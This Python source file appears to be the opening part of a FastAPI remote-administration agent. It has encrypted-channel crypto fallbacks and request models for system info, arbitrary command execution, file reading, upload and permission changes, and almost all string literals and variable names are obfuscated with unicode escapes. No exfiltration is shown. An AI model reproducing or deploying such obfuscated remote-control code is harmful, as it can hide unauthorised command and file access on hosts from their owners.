import codecs
import os
import sys
import json
import time
import base64
import hashlib
import hmac
import secrets
import threading
from datetime import datetime, timezone
from typing import Union, List, Dict, Any, Optional
from fastapi import FastAPI, Request, Response, HTTPException, status
from fastapi.responses import JSONResponse
from starlette.middleware.base import BaseHTTPMiddleware
from urllib.parse import unquote, urlsplit
from ecdsa import SigningKey, VerifyingKey, BadSignatureError, NIST256p
from ecdsa.util import sigdecode_der, sigdecode_string
import binascii
try:
    from ecies import encrypt as ecies_encrypt
except Exception:
    import hmac as _hmac_mod
    _SECP_P = 115792089237316195423570985008687907853269984665640564039457584007908834671663
    _SECP_N = 115792089237316195423570985008687907852837564279074904382605163141518161494337

    def _secp_decompress_pub(O0_var_1: bytes):
        from ecdsa import SECP256k1, VerifyingKey
        from ecdsa.ellipticcurve import Point
        if len(O0_var_1) == 65 and O0_var_1[0] == 4:
            return VerifyingKey.from_string(O0_var_1[1:], curve=SECP256k1).pubkey.point
        if len(O0_var_1) == 33 and O0_var_1[0] in (2, 3):
            O0_var_2 = int.from_bytes(O0_var_1[1:], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
            O0_var_3 = (pow(O0_var_2, 3, _SECP_P) + 7) % _SECP_P
            O0_var_4 = pow(O0_var_3, (_SECP_P + 1) // 4, _SECP_P)
            if O0_var_4 * O0_var_4 % _SECP_P != O0_var_3:
                raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0063\\u006f\\u006d\\u0070\\u0072\\u0065\\u0073\\u0073\\u0065\\u0064\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079', 'unicode_escape'))
            if O0_var_4 & 1 != O0_var_1[0] - 2:
                O0_var_4 = _SECP_P - O0_var_4
            return Point(SECP256k1.curve, O0_var_2, O0_var_4)
        raise ValueError(codecs.decode('\\u0075\\u006e\\u0073\\u0075\\u0070\\u0070\\u006f\\u0072\\u0074\\u0065\\u0064\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u0020\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074', 'unicode_escape'))

    def _secp_point_bytes(O0_var_5) -> bytes:
        return b'\x04' + O0_var_5.x().to_bytes(32, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) + O0_var_5.y().to_bytes(32, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))

    def _kisama_hkdf_sha256(O0_var_6: bytes, O0_var_7: int=32) -> bytes:
        O0_var_8 = _hmac_mod.new(b'', O0_var_6, hashlib.sha256).digest()
        O0_var_9 = b''
        O0_var_10 = b''
        O0_var_11 = 1
        while len(O0_var_9) < O0_var_7:
            O0_var_10 = _hmac_mod.new(O0_var_8, O0_var_10 + bytes([O0_var_11]), hashlib.sha256).digest()
            O0_var_9 += O0_var_10
            O0_var_11 += 1
        return O0_var_9[:O0_var_7]

    def _kisama_ecies_encrypt_fallback(O0_var_12: bytes, data: bytes) -> bytes:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        from ecdsa import SECP256k1, SigningKey as _EcdsaSigningKey
        O0_var_13 = _secp_decompress_pub(O0_var_12)
        while True:
            O0_var_14 = secrets.token_bytes(32)
            if 0 < int.from_bytes(O0_var_14, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) < _SECP_N:
                break
        O0_var_15 = b'\x04' + _EcdsaSigningKey.from_string(O0_var_14, curve=SECP256k1).get_verifying_key().to_string()
        O0_var_16 = _secp_point_bytes(O0_var_13 * int.from_bytes(O0_var_14, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')))
        O0_var_17 = _kisama_hkdf_sha256(O0_var_15 + O0_var_16)
        O0_var_18 = secrets.token_bytes(16)
        O0_var_19 = AESGCM(O0_var_17).encrypt(O0_var_18, data, None)
        return O0_var_15 + O0_var_18 + O0_var_19[-16:] + O0_var_19[:-16]
    ecies_encrypt = _kisama_ecies_encrypt_fallback
import uvicorn
import asyncio
import platform
import psutil
import aiohttp
import socket
import subprocess
import shlex
from fastapi import BackgroundTasks
from croniter import croniter
from collections import deque
from contextlib import asynccontextmanager
from pydantic import BaseModel, Field, RootModel, ConfigDict
from fastapi import Body, Depends, Query
try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
except Exception:

    def _kisama_get_random_bytes(O0_var_20: int) -> bytes:
        return os.urandom(O0_var_20)

    class _KisamaAESGCMFallback:

        def __init__(self, key: bytes, nonce: bytes):
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            self._aesgcm = AESGCM(key)
            self._nonce = nonce

        def encrypt_and_digest(self, O0_var_21: bytes):
            O0_var_22 = self._aesgcm.encrypt(self._nonce, O0_var_21, None)
            return (O0_var_22[:-16], O0_var_22[-16:])

        def decrypt_and_verify(self, O0_var_23: bytes, O0_var_24: bytes) -> bytes:
            return self._aesgcm.decrypt(self._nonce, O0_var_23 + O0_var_24, None)

    class _KisamaAESFallback:
        MODE_GCM = codecs.decode('\\u0067\\u0063\\u006d', 'unicode_escape')

        @staticmethod
        def new(key: bytes, mode, nonce: bytes=None):
            if nonce is None:
                raise ValueError(codecs.decode('\\u517c\\u5bb9\\u57ab\\u7247\\u4ec5\\u652f\\u6301\\u0020\\u0041\\u0045\\u0053\\u002d\\u0047\\u0043\\u004d\\u0020\\u4e14\\u5fc5\\u987b\\u63d0\\u4f9b\\u0020\\u006e\\u006f\\u006e\\u0063\\u0065', 'unicode_escape'))
            return _KisamaAESGCMFallback(key, nonce)
    AES = _KisamaAESFallback
    get_random_bytes = _kisama_get_random_bytes
from noise.connection import NoiseConnection, Keypair
from fastapi import WebSocket, WebSocketDisconnect
import shutil
import struct
import select
import signal
if os.name == codecs.decode('\\u006e\\u0074', 'unicode_escape'):
    termios = None
    fcntl = None
    pty = None
else:
    import termios
    import fcntl
    import pty
import http.client
import queue
import ssl
import urllib.error
import urllib.request
import uuid
from dataclasses import dataclass, asdict
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives import serialization
from typing import Tuple

def _resolve_safe_cwd():
    for O0_var_25 in (os.environ.get(codecs.decode('\\u0055\\u0053\\u0045\\u0052\\u0050\\u0052\\u004f\\u0046\\u0049\\u004c\\u0045', 'unicode_escape')), os.environ.get(codecs.decode('\\u0048\\u004f\\u004d\\u0045', 'unicode_escape')), os.path.expanduser(codecs.decode('\\u007e', 'unicode_escape'))):
        if O0_var_25 and os.path.isdir(O0_var_25):
            return O0_var_25
    return codecs.decode('\\u002e', 'unicode_escape')

def _resolve_safe_file_root():
    for O0_var_26 in (os.getenv(codecs.decode('\\u0046\\u0049\\u004c\\u0045\\u005f\\u0052\\u004f\\u004f\\u0054', 'unicode_escape')), os.path.expanduser(codecs.decode('\\u007e', 'unicode_escape'))):
        if O0_var_26 and os.path.isdir(O0_var_26):
            return O0_var_26
        if O0_var_26:
            print(codecs.decode('\\u005b\\u0057\\u0041\\u0052\\u004e\\u005d\\u0020\\u0046\\u0049\\u004c\\u0045\\u005f\\u0052\\u004f\\u004f\\u0054\\u0020\\u5019\\u9009\\u76ee\\u5f55\\u4e0d\\u5b58\\u5728\\u002c\\u0020\\u5df2\\u8df3\\u8fc7\\u003a\\u0020', 'unicode_escape') + str(O0_var_26))
    print(codecs.decode('\\u005b\\u0057\\u0041\\u0052\\u004e\\u005d\\u0020\\u0046\\u0049\\u004c\\u0045\\u005f\\u0052\\u004f\\u004f\\u0054\\u0020\\u5168\\u90e8\\u5019\\u9009\\u65e0\\u6548\\u002c\\u0020\\u964d\\u7ea7\\u5230\\u5f53\\u524d\\u5de5\\u4f5c\\u76ee\\u5f55\\u003a\\u0020', 'unicode_escape') + str(os.getcwd()))
    return os.getcwd()

class SResponse(BaseModel):
    codecs.decode('\\u901a\\u7528\\u72b6\\u6001\\u54cd\\u5e94', 'unicode_escape')
    status: str = Field(codecs.decode('\\u006f\\u006b', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape')])

class CountResponse(SResponse):
    codecs.decode('\\u5e26\\u8ba1\\u6570\\u7684\\u901a\\u7528\\u54cd\\u5e94', 'unicode_escape')
    count: int = Field(..., examples=[0])

class BaseInfoResponse(BaseModel):
    codecs.decode('\\u4ee3\\u7406\\u57fa\\u7840\\u4fe1\\u606f\\u54cd\\u5e94\\u6a21\\u578b', 'unicode_escape')
    arch: str = Field(..., description=codecs.decode('\\u0043\\u0050\\u0055\\u67b6\\u6784', 'unicode_escape'), examples=[codecs.decode('\\u0078\\u0038\\u0036\\u005f\\u0036\\u0034', 'unicode_escape')])
    cpu_cores: int = Field(..., description=codecs.decode('\\u0043\\u0050\\u0055\\u6838\\u5fc3\\u6570', 'unicode_escape'), examples=[4])
    cpu_name: str = Field(..., description=codecs.decode('\\u0043\\u0050\\u0055\\u578b\\u53f7', 'unicode_escape'), examples=[codecs.decode('\\u0049\\u006e\\u0074\\u0065\\u006c\\u0028\\u0052\\u0029\\u0020\\u0058\\u0065\\u006f\\u006e\\u0028\\u0052\\u0029\\u0020\\u0043\\u0050\\u0055\\u0020\\u0040\\u0020\\u0032\\u002e\\u0032\\u0030\\u0047\\u0048\\u007a', 'unicode_escape')])
    disk_total: int = Field(..., description=codecs.decode('\\u78c1\\u76d8\\u603b\\u5bb9\\u91cf\\u0028\\u5b57\\u8282\\u0029', 'unicode_escape'), examples=[48360738816])
    gpu_name: str = Field(codecs.decode('', 'unicode_escape'), description=codecs.decode('\\u0047\\u0050\\u0055\\u578b\\u53f7', 'unicode_escape'), examples=[codecs.decode('\\u004e\\u0056\\u0049\\u0044\\u0049\\u0041\\u0020\\u0047\\u0065\\u0046\\u006f\\u0072\\u0063\\u0065\\u0020\\u0052\\u0054\\u0058\\u0020\\u0033\\u0030\\u0039\\u0030', 'unicode_escape')])
    ipv4: Optional[str] = Field(None, description=codecs.decode('\\u0049\\u0050\\u0076\\u0034\\u5730\\u5740', 'unicode_escape'), examples=[codecs.decode('\\u0031\\u0039\\u0032\\u002e\\u0031\\u0036\\u0038\\u002e\\u0031\\u002e\\u0031\\u0030\\u0030', 'unicode_escape')])
    ipv6: Optional[str] = Field(None, description=codecs.decode('\\u0049\\u0050\\u0076\\u0036\\u5730\\u5740', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0030\\u0031\\u003a\\u0064\\u0062\\u0038\\u003a\\u003a\\u0031', 'unicode_escape')])
    mem_total: int = Field(..., description=codecs.decode('\\u5185\\u5b58\\u603b\\u91cf\\u0028\\u5b57\\u8282\\u0029', 'unicode_escape'), examples=[8589934592])
    os: str = Field(..., description=codecs.decode('\\u64cd\\u4f5c\\u7cfb\\u7edf\\u540d\\u79f0', 'unicode_escape'), examples=[codecs.decode('\\u0055\\u0062\\u0075\\u006e\\u0074\\u0075\\u0020\\u0032\\u0032\\u002e\\u0030\\u0034', 'unicode_escape')])
    kernel_version: str = Field(..., description=codecs.decode('\\u5185\\u6838\\u7248\\u672c', 'unicode_escape'), examples=[codecs.decode('\\u0035\\u002e\\u0031\\u0035\\u002e\\u0030\\u002d\\u0037\\u0036\\u002d\\u0067\\u0065\\u006e\\u0065\\u0072\\u0069\\u0063', 'unicode_escape')])
    swap_total: int = Field(..., description=codecs.decode('\\u4ea4\\u6362\\u5206\\u533a\\u603b\\u91cf\\u0028\\u5b57\\u8282\\u0029', 'unicode_escape'), examples=[0])
    version: str = Field(..., description=codecs.decode('\\u4ee3\\u7406\\u7248\\u672c', 'unicode_escape'), examples=[codecs.decode('\\u0030\\u002e\\u0030\\u002e\\u0031', 'unicode_escape')])
    virtualization: str = Field(..., description=codecs.decode('\\u865a\\u62df\\u5316\\u73af\\u5883', 'unicode_escape'), examples=[codecs.decode('\\u004e\\u006f\\u006e\\u0065', 'unicode_escape')])
    session_key: Optional[bytes] = Field(None, description=codecs.decode('\\u672c\\u6b21\\u4f1a\\u8bdd\\u7684\\u52a8\\u6001\\u0020\\u0041\\u0045\\u0053\\u002d\\u0032\\u0035\\u0036\\u0020\\u5bc6\\u94a5\\u0020\\u0028\\u660e\\u6587\\uff0c\\u7531\\u4e2d\\u95f4\\u4ef6\\u8d1f\\u8d23\\u52a0\\u5bc6\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u006b\\u0037\\u0042\\u0076\\u0039\\u002e\\u002e\\u002e\\u0033\\u0032\\u4f4d\\u5bc6\\u94a5\\u5b57\\u7b26\\u4e32\\u6216\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034', 'unicode_escape')])
    noise_key: Optional[Dict[str, Any]] = Field(None, description=codecs.decode('\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u5bc6\\u94a5\\u914d\\u7f6e\\uff0c\\u63a5\\u6536\\u4efb\\u610f\\u5b57\\u5178\\u7ed3\\u6784', 'unicode_escape'))

class StatusResponse(BaseModel):
    codecs.decode('\\u5b9e\\u65f6\\u76d1\\u63a7\\u4fe1\\u606f\\u54cd\\u5e94\\u6a21\\u578b', 'unicode_escape')
    cpu: Dict[str, float] = Field(..., description=codecs.decode('\\u0043\\u0050\\u0055\\u4f7f\\u7528\\u7387', 'unicode_escape'), examples=[{codecs.decode('\\u0075\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): 12.5}])
    ram: Dict[str, int] = Field(..., description=codecs.decode('\\u5185\\u5b58\\u4fe1\\u606f', 'unicode_escape'), examples=[{codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 8589934592, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 4000000000}])
    swap: Dict[str, int] = Field(..., description=codecs.decode('\\u4ea4\\u6362\\u5206\\u533a\\u4fe1\\u606f', 'unicode_escape'), examples=[{codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 0}])
    load: Dict[str, float] = Field(..., description=codecs.decode('\\u7cfb\\u7edf\\u8d1f\\u8f7d', 'unicode_escape'), examples=[{codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0031', 'unicode_escape'): 0.5, codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0035', 'unicode_escape'): 0.4, codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0031\\u0035', 'unicode_escape'): 0.3}])
    disk: Dict[str, int] = Field(..., description=codecs.decode('\\u78c1\\u76d8\\u4fe1\\u606f', 'unicode_escape'), examples=[{codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 48360738816, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 30000000000}])
    network: Dict[str, int] = Field(..., description=codecs.decode('\\u7f51\\u7edc\\u7edf\\u8ba1', 'unicode_escape'), examples=[{codecs.decode('\\u0075\\u0070', 'unicode_escape'): 1024, codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): 2048, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u0055\\u0070', 'unicode_escape'): 1000000, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u0044\\u006f\\u0077\\u006e', 'unicode_escape'): 2000000}])
    connections: Dict[str, int] = Field(..., description=codecs.decode('\\u8fde\\u63a5\\u6570', 'unicode_escape'), examples=[{codecs.decode('\\u0074\\u0063\\u0070', 'unicode_escape'): 20, codecs.decode('\\u0075\\u0064\\u0070', 'unicode_escape'): 5}])
    uptime: int = Field(..., description=codecs.decode('\\u8fd0\\u884c\\u65f6\\u95f4\\u0028\\u79d2\\u0029', 'unicode_escape'), examples=[3600])
    process: int = Field(..., description=codecs.decode('\\u8fdb\\u7a0b\\u6570\\u91cf', 'unicode_escape'), examples=[150])
    message: str = Field(codecs.decode('', 'unicode_escape'), description=codecs.decode('\\u9644\\u52a0\\u6d88\\u606f', 'unicode_escape'), examples=[codecs.decode('', 'unicode_escape')])

class ExecResponse(BaseModel):
    result: str = Field(..., description=codecs.decode('\\u547d\\u4ee4\\u8f93\\u51fa\\u0028\\u0073\\u0074\\u0064\\u006f\\u0075\\u0074\\u002b\\u0073\\u0074\\u0064\\u0065\\u0072\\u0072\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u0020\\u0034\\u000a\\u0064\\u0072\\u0077\\u0078\\u0072\\u002d\\u0078\\u0072\\u002d\\u0078\\u002e\\u002e\\u002e', 'unicode_escape')])
    exitcode: int = Field(..., description=codecs.decode('\\u9000\\u51fa\\u7801\\u0020\\u0028\\u0030\\u003d\\u6210\\u529f\\u002c\\u0020\\u0031\\u0032\\u0034\\u003d\\u8d85\\u65f6\\u002c\\u0020\\u0031\\u0032\\u0037\\u003d\\u672a\\u627e\\u5230\\u0029', 'unicode_escape'), examples=[0])
    timeout: bool = Field(..., description=codecs.decode('\\u662f\\u5426\\u56e0\\u8d85\\u65f6\\u88ab\\u7ec8\\u6b62', 'unicode_escape'), examples=[False])
    cmd: str = Field(..., description=codecs.decode('\\u5b9e\\u9645\\u6267\\u884c\\u7684\\u547d\\u4ee4', 'unicode_escape'), examples=[codecs.decode('\\u006c\\u0073\\u0020\\u002d\\u006c\\u0061\\u0020\\u002f\\u0074\\u006d\\u0070', 'unicode_escape')])

class TempKeyEcdsaPair(BaseModel):
    codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u0020\\u5bc6\\u94a5\\u5bf9\\u0020\\u0028\\u0050\\u0045\\u004d\\u0020\\u683c\\u5f0f\\u0029', 'unicode_escape')
    private_key: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u0020\\u79c1\\u94a5\\u0020\\u0028\\u0050\\u0045\\u004d\\u002c\\u0020\\u7528\\u4e8e\\u7b7e\\u540d\\u8bf7\\u6c42\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0052\\u0049\\u0056\\u0041\\u0054\\u0045\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d\\u002e\\u002e\\u002e', 'unicode_escape')])
    public_key: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u0020\\u516c\\u94a5\\u0020\\u0028\\u0050\\u0045\\u004d\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0055\\u0042\\u004c\\u0049\\u0043\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d\\u002e\\u002e\\u002e', 'unicode_escape')])

class TempKeyEciesPair(BaseModel):
    codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u5bc6\\u94a5\\u5bf9\\u0020\\u0028\\u5341\\u516d\\u8fdb\\u5236\\u683c\\u5f0f\\u0029', 'unicode_escape')
    private_key: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u79c1\\u94a5\\u0020\\u0028\\u0068\\u0065\\u0078\\u002c\\u0020\\u0036\\u0034\\u5b57\\u7b26\\u003d\\u0033\\u0032\\u5b57\\u8282\\u002c\\u0020\\u7528\\u4e8e\\u89e3\\u5bc6\\u54cd\\u5e94\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0061\\u0065\\u0036\\u0038\\u0064\\u0030\\u0065\\u0063\\u0038\\u0033\\u0065\\u0037\\u0065\\u0061\\u0030\\u0064\\u0034\\u0037\\u0034\\u0033\\u0034\\u0061\\u0035\\u0039\\u0063\\u0034\\u0032\\u0036\\u0035\\u0036\\u0064\\u0033\\u0030\\u0065\\u0036\\u0065\\u0062\\u0065\\u0031\\u0063\\u0039\\u0032\\u0039\\u0037\\u0036\\u0062\\u0035\\u0037\\u0031\\u0038\\u0035\\u0039\\u0063\\u0038\\u0066\\u0063\\u0062\\u0064\\u0064\\u0030\\u0034\\u0038\\u0037\\u0030', 'unicode_escape')])
    public_key: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u516c\\u94a5\\u0020\\u0028\\u0068\\u0065\\u0078\\u002c\\u0020\\u0031\\u0033\\u0030\\u5b57\\u7b26\\u003d\\u0036\\u0035\\u5b57\\u8282\\u002c\\u0020\\u4f9b\\u4ee3\\u7406\\u7aef\\u52a0\\u5bc6\\u54cd\\u5e94\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0030\\u0034\\u0062\\u0063\\u0066\\u0037\\u0031\\u0063\\u0036\\u0037\\u0062\\u0039\\u0066\\u0033\\u0036\\u0037\\u0032\\u0035\\u0066\\u0035\\u0034\\u0063\\u0034\\u0031\\u0066\\u0039\\u0036\\u0035\\u0032\\u0061\\u0063\\u0066\\u002e\\u002e\\u002e', 'unicode_escape')])

class TempKeyResponse(BaseModel):
    codecs.decode('\\u83b7\\u53d6\\u4e34\\u65f6\\u5bc6\\u94a5\\u54cd\\u5e94\\u6a21\\u578b', 'unicode_escape')
    status: str = Field(codecs.decode('\\u006f\\u006b', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape')])
    key_id: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u5bc6\\u94a5\\u6807\\u8bc6', 'unicode_escape'), examples=[codecs.decode('\\u0033\\u0066\\u0039\\u0061\\u0030\\u0062\\u0032\\u0063\\u0034\\u0064\\u0035\\u0065\\u0036\\u0066\\u0037\\u0038', 'unicode_escape')])
    ttl_seconds: int = Field(..., description=codecs.decode('\\u6709\\u6548\\u671f\\u0028\\u79d2\\u0029', 'unicode_escape'), examples=[86400])
    created_at: str = Field(..., description=codecs.decode('\\u751f\\u6210\\u65f6\\u95f4\\u0020\\u0028\\u0055\\u0054\\u0043\\u0020\\u0049\\u0053\\u004f\\u0038\\u0036\\u0030\\u0031\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0036\\u002d\\u0030\\u0038\\u002d\\u0030\\u0038\\u0054\\u0031\\u0030\\u003a\\u0030\\u0030\\u003a\\u0030\\u0030\\u005a', 'unicode_escape')])
    expires_at: str = Field(..., description=codecs.decode('\\u8fc7\\u671f\\u65f6\\u95f4\\u0020\\u0028\\u0055\\u0054\\u0043\\u0020\\u0049\\u0053\\u004f\\u0038\\u0036\\u0030\\u0031\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0036\\u002d\\u0030\\u0038\\u002d\\u0030\\u0039\\u0054\\u0031\\u0030\\u003a\\u0030\\u0030\\u003a\\u0030\\u0030\\u005a', 'unicode_escape')])
    ecdsa: TempKeyEcdsaPair
    ecies: TempKeyEciesPair

class ExecRequestJSON(BaseModel):
    cmd: str = Field(..., description=codecs.decode('\\u8981\\u6267\\u884c\\u7684\\u547d\\u4ee4', 'unicode_escape'), examples=[codecs.decode('\\u006c\\u0073\\u0020\\u002d\\u006c\\u0061\\u0020\\u002f\\u0074\\u006d\\u0070', 'unicode_escape'), codecs.decode('\\u0070\\u0079\\u0074\\u0068\\u006f\\u006e\\u0020\\u002d\\u002d\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape')])
    cwd: Optional[str] = Field(None, description=codecs.decode('\\u5de5\\u4f5c\\u76ee\\u5f55', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070', 'unicode_escape'), codecs.decode('\\u002f\\u0076\\u0061\\u0072\\u002f\\u006c\\u006f\\u0067', 'unicode_escape')])
    env: Optional[Dict[str, str]] = Field(None, description=codecs.decode('\\u989d\\u5916\\u73af\\u5883\\u53d8\\u91cf', 'unicode_escape'), examples=[{codecs.decode('\\u0050\\u0041\\u0054\\u0048', 'unicode_escape'): codecs.decode('\\u002f\\u0075\\u0073\\u0072\\u002f\\u0062\\u0069\\u006e', 'unicode_escape'), codecs.decode('\\u0044\\u0045\\u0042\\u0055\\u0047', 'unicode_escape'): codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')}])

class FileListRequest(BaseModel):
    path: str = Field(codecs.decode('\\u002e', 'unicode_escape'), description=codecs.decode('\\u8981\\u5217\\u51fa\\u7684\\u76ee\\u5f55\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070', 'unicode_escape'), codecs.decode('\\u002e', 'unicode_escape'), codecs.decode('\\u002f\\u0076\\u0061\\u0072\\u002f\\u006c\\u006f\\u0067', 'unicode_escape')])
    recursive: bool = Field(False, description=codecs.decode('\\u662f\\u5426\\u9012\\u5f52\\u5217\\u51fa\\u5b50\\u76ee\\u5f55', 'unicode_escape'), examples=[True, False])

class FileInfo(BaseModel):
    name: str
    path: str
    type: str
    size: int
    mtime: str
    mode: str
    mode_octal: str
    owner: str

class FileListResponse(CountResponse):
    files: List[FileInfo]

class AuthorityQueryRequest(BaseModel):
    paths: List[str] = Field(..., description=codecs.decode('\\u8981\\u67e5\\u8be2\\u6743\\u9650\\u7684\\u6587\\u4ef6\\u002f\\u76ee\\u5f55\\u8def\\u5f84\\u5217\\u8868', 'unicode_escape'), examples=[[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0074\\u0065\\u0073\\u0074\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'), codecs.decode('\\u002f\\u0076\\u0061\\u0072\\u002f\\u006c\\u006f\\u0067', 'unicode_escape')]])

class AuthorityInfo(BaseModel):
    path: str
    name: str
    mode: str
    mode_octal: str
    type: str
    readable: bool
    writable: bool
    executable: bool

class AuthorityQueryResponse(SResponse):
    files: List[AuthorityInfo]

class AuthoritySetRequest(BaseModel):
    permissions: Dict[str, str] = Field(..., description=codecs.decode('\\u8def\\u5f84\\u5230\\u6743\\u9650\\u6a21\\u5f0f\\u7684\\u6620\\u5c04', 'unicode_escape'), examples=[{codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0074\\u0065\\u0073\\u0074\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'): codecs.decode('\\u0036\\u0034\\u0034', 'unicode_escape'), codecs.decode('\\u002f\\u006f\\u0070\\u0074\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0073', 'unicode_escape'): codecs.decode('\\u0037\\u0035\\u0035', 'unicode_escape')}])
    recursive: bool = Field(False, description=codecs.decode('\\u662f\\u5426\\u9012\\u5f52\\u5e94\\u7528\\u5230\\u5b50\\u76ee\\u5f55', 'unicode_escape'), examples=[True, False])

class AuthorityResult(BaseModel):
    path: str
    requested: str
    applied: str
    mode_octal: str
    status: str

class AuthoritySetResponse(SResponse):
    total: int
    success: int
    results: List[AuthorityResult]

class FileCatRequest(BaseModel):
    path: str = Field(..., description=codecs.decode('\\u8981\\u67e5\\u770b\\u7684\\u6587\\u4ef6\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\\u002e\\u006a\\u0073\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u002f\\u0076\\u0061\\u0072\\u002f\\u006c\\u006f\\u0067\\u002f\\u0073\\u0079\\u0073\\u006c\\u006f\\u0067', 'unicode_escape')])

class FileCatResponse(SResponse):
    path: str
    content: str
    encoding: str
    is_binary: bool
    size: int

class FileUploadRequest(BaseModel):
    path: str = Field(..., description=codecs.decode('\\u4e0a\\u4f20\\u76ee\\u6807\\u76ee\\u5f55\\u6216\\u6587\\u4ef6\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064\\u0073', 'unicode_escape'), codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006e\\u0065\\u0077\\u0066\\u0069\\u006c\\u0065\\u002e\\u0074\\u0078\\u0074', 'unicode_escape')])
    filename: Optional[str] = Field(None, description=codecs.decode('\\u6587\\u4ef6\\u540d\\u0020\\u0028\\u5f53\\u0070\\u0061\\u0074\\u0068\\u662f\\u76ee\\u5f55\\u65f6\\u5fc5\\u586b\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0062\\u0061\\u0063\\u006b\\u0075\\u0070\\u002e\\u0074\\u0061\\u0072\\u002e\\u0067\\u007a', 'unicode_escape')])
    content: str = Field(..., description=codecs.decode('\\u6587\\u4ef6\\u5185\\u5bb9\\u7684\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u7f16\\u7801', 'unicode_escape'), examples=[codecs.decode('\\u0053\\u0047\\u0056\\u0073\\u0062\\u0047\\u0038\\u0067\\u0056\\u0032\\u0039\\u0079\\u0062\\u0047\\u0051\\u0068', 'unicode_escape')])
    chunk_id: Optional[int] = Field(None, description=codecs.decode('\\u5206\\u5757\\u7d22\\u5f15\\u0020\\u0028\\u0030\\u002d\\u0062\\u0061\\u0073\\u0065\\u0064\\u0029', 'unicode_escape'), examples=[0])
    total_chunks: Optional[int] = Field(None, description=codecs.decode('\\u603b\\u5206\\u5757\\u6570', 'unicode_escape'), examples=[3])

class FileUploadRawResponse(SResponse):
